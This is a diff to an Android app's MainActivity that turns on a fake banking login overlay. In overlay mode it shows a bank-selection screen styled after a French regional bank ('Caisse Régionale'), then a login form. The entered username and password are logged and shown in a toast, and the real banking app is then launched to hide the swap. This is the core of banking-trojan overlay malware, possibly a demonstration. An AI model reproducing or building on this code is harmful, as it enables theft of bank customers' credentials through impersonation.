@@ -6,9 +6,14 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.os.Bundle
 import android.util.Log
+import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.compose.material3.MaterialTheme
+import androidx.compose.runtime.getValue
+import androidx.compose.runtime.mutableStateOf
+import androidx.compose.runtime.remember
+import androidx.compose.runtime.setValue
 import androidx.core.content.ContextCompat
 
 class MainActivity : ComponentActivity() {
@@ -41,19 +46,28 @@ class MainActivity : ComponentActivity() {
         setContent {
             MaterialTheme {
                 if (isOverlayMode) {
-                    CaisseRegionaleScreen()
-                    // Show the fake login screen when launched as overlay
-                   /* LoginScreen { username, password ->
-                        // Log or handle the captured credentials
-                        Log.d(TAG, "Captured credentials: $username / $password")
-
-                        // Close this activity and launch the real banking app
-                        val bankingAppIntent = packageManager.getLaunchIntentForPackage(targetApp)
-                        if (bankingAppIntent != null) {
-                            startActivity(bankingAppIntent)
+                    var showLogin by remember { mutableStateOf(false) }
+                    if(showLogin) {
+                        LoginScreen { username, password ->
+                            // Log or handle the captured credentials
+                            Log.d(TAG, "Captured credentials: $username / $password")
+                            //show toast
+                            Toast.makeText(this, "Captured credentials: $username / $password", Toast.LENGTH_LONG).show()
+                            // Close this activity and launch the real banking app
+                            val bankingAppIntent = packageManager.getLaunchIntentForPackage(targetApp)
+                            if (bankingAppIntent != null) {
+                                startActivity(bankingAppIntent)
+                            }
+                            finish()
                         }
-                        finish()
-                    }*/
+                    }else {
+                        CaisseRegionaleScreen(
+                            onCaisseSelected = { caisse ->
+                                Log.d(TAG, "Selected Caisse: ${caisse.name}")
+                                showLogin = true
+                            }
+                        )
+                    }
                 } else {
                     // Show control panel UI for managing the service
                     ServiceControlPanel()
